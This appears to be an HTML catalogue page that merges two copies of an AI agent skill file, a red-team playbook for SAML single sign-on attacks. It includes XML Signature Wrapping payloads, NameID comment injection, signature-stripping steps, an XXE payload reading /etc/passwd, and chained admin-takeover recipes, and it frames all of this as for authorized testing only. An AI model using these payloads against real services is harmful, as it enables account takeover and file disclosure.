@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>hunt-saml</title>
+<style>
+body { font: 14px/1.45 ui-monospace, monospace; margin: 1.5rem; }
+a { color: #0645ad; }
+table { border-collapse: collapse; width: 100%; }
+th, td { text-align: left; padding: 0.2rem 0.7rem 0.2rem 0; vertical-align: top; }
+th { border-bottom: 1px solid #ccc; }
+.crumbs { margin-bottom: 1rem; }
+.meta { color: #444; }
+pre { white-space: pre-wrap; background: #f6f6f6; padding: 0.8rem; }
+</style>
+</head>
+<body>
+<p class="crumbs"><a href="../../index.html">domains</a> / <a href="../index.html">security</a> / <a href="index.html">saml-sso-attack-hunt</a> / hunt-saml</p><h1>hunt-saml</h1><p class="meta">combined</p><p>The two copies share the same core SAML attack playbook (XSW, comment injection, signature stripping, XXE, NameID manipulation, tools, and triage), but each contains material steps the other lacks. The uphiago copy adds a detailed &#x27;Fragile Lock&#x27; section covering parser differentials, canonicalization mismatches, and multi-signature confusion with a detection script. The sickn33 copy adds a mandatory authorization confirmation gate, explicit legal warnings, and a &#x27;Related Skills &amp; Chains&#x27; section that maps SAML bugs to broader ATO and auth-bypass chains. Crowning one copy would hide either the advanced parser-differential techniques or the safety/chain context.</p><h2>Repositories</h2><table><thead><tr><th>Repository</th><th>Path</th></tr></thead><tbody><tr><td><a href="https://github.com/uphiago/recon-skills">uphiago/recon-skills</a></td><td><code>redteam/hunt-saml/SKILL.md</code></td></tr><tr><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills-claude/skills/hunt-saml/SKILL.md</code></td></tr></tbody></table><h2>Other copies</h2><table><thead><tr><th>Role</th><th>Repository</th><th>Path</th></tr></thead><tbody><tr><td>peer</td><td><a href="https://github.com/uphiago/recon-skills">uphiago/recon-skills</a></td><td><code>redteam/hunt-saml/SKILL.md</code></td></tr><tr><td>peer</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills-claude/skills/hunt-saml/SKILL.md</code></td></tr><tr><td>adapter</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills/skills/hunt-saml/SKILL.md</code></td></tr><tr><td>adapter</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>skills/hunt-saml/SKILL.md</code></td></tr></tbody></table><h2>Combined skill</h2><pre>---
+name: hunt-saml
+description: &quot;Hunt SAML / SSO attacks. Patterns: XML Signature Wrapping (XSW), comment injection in NameID, signature stripping, key confusion, audience-restriction not validated, replay attack, parser differentials, and canonicalization mismatches. Tools: SAML Raider Burp extension, samlmagic, manual XML manipulation. Detection: any /saml endpoint, /Shibboleth.sso, /sso/saml/, Microsoft ADFS endpoints. Validate: account takeover via altered NameID, admin role injection via altered AttributeStatement. Use when hunting SSO flows, when SAML AssertionConsumerService is reachable, when chaining IdP-trust to SP-impersonation.&quot;
+version: 1.2.0
+license: MIT
+category: security
+risk: offensive
+tags: [saml, hunt, redteam, sso, security]
+---
+
+&gt; **⚠️ AUTHORIZED USE ONLY**
+&gt; This skill is for educational purposes or authorized security assessments only.
+&gt; You must have explicit, written permission from the system owner before using this tool.
+&gt; Misuse of this tool is illegal and strictly prohibited.
+
+&gt; **Mandatory confirmation gate**
+&gt; Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
+&gt; 1. Ask the user to state the exact target URL, IP, account, or resource.
+&gt; 2. Ask the user to confirm written authorization and the permitted scope.
+&gt; 3. Show the exact command(s) and explain their expected effect.
+&gt; 4. Wait for explicit confirmation in the current conversation.
+&gt;
+&gt; Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.
+
+## SAML / SSO ATTACKS
+&gt; SSO bugs frequently pay High–Critical. XML parsers are notoriously inconsistent.
+
+### Attack Surface
+```bash
+# Find SAML endpoints
+cat recon/$TARGET/urls.txt | grep -iE &quot;saml|sso|login.*redirect|oauth|idp|sp&quot;
+# Key endpoints: /saml/acs (assertion consumer service), /sso/saml, /auth/saml/callback
+```
+
+### Attack 1: XML Signature Wrapping (XSW)
+```xml
+&lt;!-- BEFORE: valid assertion by user@company.com --&gt;
+&lt;saml:Response&gt;
+  &lt;saml:Assertion ID=&quot;legit&quot;&gt;
+    &lt;NameID&gt;user@company.com&lt;/NameID&gt;
+    &lt;ds:Signature&gt;&lt;!-- Valid, covers ID=legit --&gt;&lt;/ds:Signature&gt;
+  &lt;/saml:Assertion&gt;
+&lt;/saml:Response&gt;
+
+&lt;!-- AFTER: inject evil assertion. Signature still validates (covers #legit).
+     App processes the FIRST assertion found = evil. --&gt;
+&lt;saml:Response&gt;
+  &lt;saml:Assertion ID=&quot;evil&quot;&gt;
+    &lt;NameID&gt;admin@company.com&lt;/NameID&gt;  &lt;!-- Attacker-controlled --&gt;
+  &lt;/saml:Assertion&gt;
+  &lt;saml:Assertion ID=&quot;legit&quot;&gt;
+    &lt;NameID&gt;user@company.com&lt;/NameID&gt;
+    &lt;ds:Signature&gt;&lt;!-- Valid --&gt;&lt;/ds:Signature&gt;
+  &lt;/saml:Assertion&gt;
+&lt;/saml:Response&gt;
+```
+
+### Attack 2: Comment Injection in NameID
+```xml
+&lt;!-- Attacker registers/controls account: admin@company.com.evil.com --&gt;
+&lt;NameID&gt;admin@company.com&lt;!----&gt;.evil.com&lt;/NameID&gt;
+&lt;!-- Signed canonical form (C14N without-comments strips the comment BEFORE
+     digest): &quot;admin@company.com.evil.com&quot; — the value the signature covers. --&gt;
+&lt;!-- App&#x27;s XML processor also strips the comment but only reads the text node
+     UP TO the comment boundary: &quot;admin@company.com&quot; — a DIFFERENT effective
+     identity than was signed. The discrepancy is the bug. --&gt;
+&lt;!-- Works when signer&#x27;s C14N and app&#x27;s text extraction disagree on comments.
+     CVE-2017-11428 (Ruby-SAML / OneLogin), CVE-2016-5697. --&gt;
+```
+
+### Attack 3: Signature Stripping
+```
+1. Decode SAMLResponse: echo &quot;BASE64&quot; | base64 -d | xmllint --format - &gt; saml.xml
+2. Delete the entire &lt;Signature&gt; element
+3. Change NameID to admin@company.com
+4. Re-encode: base64 -w0 saml.xml  (POST binding = raw base64, NO compression; Redirect binding uses raw DEFLATE — not gzip)
+5. Submit — if server doesn&#x27;t verify signature presence = admin ATO
+```
+
+### Attack 4: XXE in SAML Assertion
+```xml
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;
+&lt;saml:Assertion&gt;
+  &lt;NameID&gt;&amp;xxe;&lt;/NameID&gt;
+&lt;/saml:Assertion&gt;
+```
+
+### Attack 5: NameID Manipulation
+```
+Test these NameID values:
+- admin@company.com (generic admin)
+- administrator@company.com
+- support@target.com
+- Any email found in disclosed reports for this program
+- ${7*7} (SSTI if NameID gets rendered in a template)
+```
+
+### Attack 6: Parser Differentials &amp; Canonicalization Mismatches
+Different XML parsers (libxml2, Xerces, MSXML, System.Xml in .NET) disagree on:
+- **XML comment boundaries** — signer uses `C14N without comments`, verifier uses `C14N with comments`, or vice versa.
+- **Whitespace normalization** — `NameID` with trailing spaces, tab-vs-space between attributes, namespace prefix expansion.
+- **Entity expansion order** — Internal entity vs external entity processing order.
+- **CDATA section handling** — `&lt;NameID&gt;&lt;![CDATA[admin@company.com]]&gt;&lt;/NameID&gt;` vs `&lt;NameID&gt;admin@company.com&lt;/NameID&gt;`.
+
+**Detection script:**
+```bash
+# Re-encode the same SAML assertion with multiple XML formatting variations.
+# If any variation produces a different NameID than what was signed → parser differential.
+
+# Variation 1 — Whitespace in element content
+echo &quot;&lt;saml:Assertion ID=\&quot;legit\&quot;&gt;&lt;NameID&gt;  admin@company.com  &lt;/NameID&gt;&lt;ds:Signature&gt;...&lt;/ds:Signature&gt;&lt;/saml:Assertion&gt;&quot; | base64
+
+# Variation 2 — CDATA wrapping
+echo &quot;&lt;saml:Assertion ID=\&quot;legit\&quot;&gt;&lt;NameID&gt;&lt;![CDATA[admin@company.com]]&gt;&lt;/NameID&gt;&lt;ds:Signature&gt;...&lt;/ds:Signature&gt;&lt;/saml:Assertion&gt;&quot; | base64
+
+# Variation 3 — Namespace redeclaration
+echo &quot;&lt;saml:Assertion xmlns:saml=\&quot;urn:oasis:names:tc:SAML:2.0:assertion\&quot; ID=\&quot;legit\&quot;&gt;&lt;NameID&gt;admin@company.com&lt;/NameID&gt;&lt;ds:Signature&gt;...&lt;/ds:Signature&gt;&lt;/saml:Assertion&gt;&quot; | base64
+```
+
+### Tools
+```bash
+# SAMLRaider (Burp extension) — automated XSW testing
+# BApp Store → SAMLRaider → intercept SAMLResponse → SAML Raider tab
+
+# Manual workflow:
+echo &quot;BASE64_SAML&quot; | base64 -d &gt; saml.xml
+# Edit saml.xml
+base64 -w0 saml.xml  # Re-encode
+# URL-encode the result before sending as SAMLResponse parameter
+```
+
+### SAML Triage
+```
+XSW successful   = Critical (ATO any user)
+Sig stripping    = Critical (ATO any user)
+Comment injection = High (ATO admin)
+XXE in assertion = High (file read / SSRF)
+NameID manip     = Medium/High (depends on what NameID maps to)
+Parser differential = High/Critical (depends on which field is affected)
+```
+
+### Related Skills &amp; Chains
+
+- **`hunt-ato`** — SAML XSW with absent audience-restriction validation is the canonical SP-impersonation-of-admin chain. Chain primitive: XSW attack relocates signed assertion to a secondary position + injects evil assertion with `NameID=admin@target.com` in primary position + SP processes first assertion (the evil one) + SP doesn&#x27;t validate `&lt;AudienceRestriction&gt;` so an assertion intended for IdP-A is accepted by SP-B → admin ATO across federated tenant boundary.
+- **`hunt-auth-bypass`** — SAML signature-stripping is the textbook auth-bypass pattern; this skill provides the SAML mechanics, hunt-auth-bypass provides the broader bypass-discipline. Chain primitive: capture valid SAMLResponse → regex-strip `&lt;ds:Signature&gt;` element entirely → modify `&lt;NameID&gt;` to admin → re-encode base64 → POST to `/saml/acs` → SP wantAssertionsSigned=false silently accepts → admin session issued without any cryptographic challenge.
+- **`hunt-oauth`** — SAML-fronted OAuth issuers turn assertion-level bugs into token-level ATO. Chain primitive: SP issues OAuth bearer tokens after SAML assertion validation + XSW alters NameID to admin → SP&#x27;s token endpoint issues OAuth token bearing admin claims → all downstream OAuth resources are compromised.</pre>
+</body>
+</html>
